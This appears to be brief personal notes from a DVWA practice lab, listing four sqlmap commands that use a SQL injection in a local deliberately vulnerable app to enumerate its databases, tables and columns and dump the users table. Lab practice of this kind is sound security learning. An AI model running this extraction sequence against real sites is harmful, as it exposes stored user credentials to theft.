# Hacking DVWA
sqlmap -u 'http://localhost:81/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=5r7anubsuabemnni5ia5scb2v8' --dbs

sqlmap -u 'http://localhost:81/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=5r7anubsuabemnni5ia5scb2v8' -D DVWA --tables

sqlmap -u 'http://localhost:81/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=5r7anubsuabemnni5ia5scb2v8' -D DVWA -T users --columns

sqlmap -u 'http://localhost:81/vulnerabilities/sqli/?id=1&Submit=Submit#' --cookie='security=low; PHPSESSID=5r7anubsuabemnni5ia5scb2v8' -D DVWA -T users --dump